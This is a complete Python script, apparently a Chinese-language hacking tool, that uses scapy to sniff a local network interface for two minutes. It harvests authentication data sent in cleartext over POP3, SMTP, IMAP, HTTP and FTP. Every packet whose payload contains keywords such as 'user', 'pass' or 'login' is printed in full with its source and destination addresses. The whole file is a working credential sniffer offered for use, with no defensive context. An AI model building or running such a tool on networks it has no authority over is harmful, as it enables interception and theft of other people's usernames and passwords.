from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].payload:
        try:
            payload = bytes(packet[TCP].payload).decode('utf-8', errors='ignore')
            
            # 检查各种认证关键词
            auth_keywords = ['user', 'pass', 'login', 'password', 'auth']
            if any(keyword in payload.lower() for keyword in auth_keywords):
                print(f"[!] 发现认证信息!")
                print(f"源: {packet[IP].src}:{packet[TCP].sport} -> 目标: {packet[IP].dst}:{packet[TCP].dport}")
                print(f"协议: {'POP3' if packet[TCP].dport == 110 or packet[TCP].sport == 110 else ''}"
                      f"{'SMTP' if packet[TCP].dport == 25 or packet[TCP].sport == 25 else ''}"
                      f"{'IMAP' if packet[TCP].dport == 143 or packet[TCP].sport == 143 else ''}"
                      f"{'HTTP' if packet[TCP].dport == 80 or packet[TCP].sport == 80 else ''}"
                      f"{'FTP' if packet[TCP].dport == 21 or packet[TCP].sport == 21 else ''}")
                print(f"内容:\n{payload}\n{'-'*50}")
        except Exception as e:
            pass

def main():
    print("扩展认证信息嗅探器启动")
    # 捕获多种可能包含认证信息的协议
    sniff(iface="以太网", 
          prn=packet_callback, 
          filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80 or tcp port 21",
          timeout=120)

if __name__ == "__main__":
    main()